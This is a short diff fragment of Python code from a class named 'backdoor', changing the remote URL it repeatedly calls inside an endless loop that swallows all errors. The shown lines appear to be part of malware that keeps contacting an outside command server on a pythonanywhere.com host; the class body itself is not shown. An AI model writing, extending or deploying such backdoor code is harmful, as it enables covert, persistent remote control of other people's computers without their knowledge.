@@ -241,7 +241,7 @@ class backdoor:
 
 while True:
     try:
-        backdoor("https://pybdtest.pythonanywhere.com/pc/30/") 
+        backdoor("https://pybdtest.pythonanywhere.com/") 
     except:
         pass
     try: 
